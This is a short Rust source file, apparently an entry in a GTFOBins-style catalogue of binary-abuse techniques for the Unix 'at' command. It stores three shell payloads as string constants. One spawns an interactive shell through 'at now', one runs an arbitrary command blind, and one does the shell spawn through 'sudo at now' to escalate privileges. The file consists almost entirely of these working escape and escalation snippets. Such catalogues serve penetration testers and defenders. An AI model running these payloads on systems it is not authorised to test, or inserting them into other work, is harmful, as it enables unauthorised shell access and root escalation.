pub static BIN_NAME: &'static str = "at";
pub static SH_CODE: &'static str = r#"
    
    echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
"#;
pub static CMD_DESC: &'static str = "The invocation will be blind, but it is possible to redirect the output to a file in a readable location.";
pub static CMD_CODE: &'static str = r#"
    
    COMMAND=id
    echo "$COMMAND" | at now
"#;
pub static SUDO_CODE: &'static str = r#"
    
    echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code {
    title: "SH_CODE",
    code: SH_CODE,
    tag: Tag::SH,
};
pub static CMD: Code<'static> = Code {
    title: "CMD_CODE",
    code: CMD_CODE,
    tag: Tag::CMD,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
